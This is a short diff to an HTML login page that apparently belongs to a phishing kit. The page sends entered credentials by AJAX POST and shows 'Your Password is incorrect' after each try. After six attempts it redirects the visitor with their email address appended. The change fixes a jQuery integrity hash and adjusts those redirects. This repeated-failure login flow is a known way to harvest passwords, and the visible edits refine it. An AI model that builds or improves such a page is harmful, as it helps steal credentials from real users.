@@ -1,7 +1,7 @@
 <html><head>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
   <script src="https://code.jquery.com/jquery-3.1.1.min.js">
-  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="" 
+  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" 
   crossorigin="anonymous"/></script>
     <!-- Required meta tags -->
     <meta charset="utf-8">
@@ -276,7 +276,7 @@ type: 'POST',
             			if (count>=6) {
             				count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace(+email);
+                    window.location.replace("#"+email);
 
                 }
                 $('#msg').html(response['msg']);
@@ -290,7 +290,7 @@ type: 'POST',
     	$("#password").val("");
     	if (count>=6) {
     		count=0;
-    		window.location.replace(+email);
+    		window.location.replace("#"+email);
     	}
     	$("#msg").show();
     	$('#msg').html("Your Password is incorrect.! Please try again");
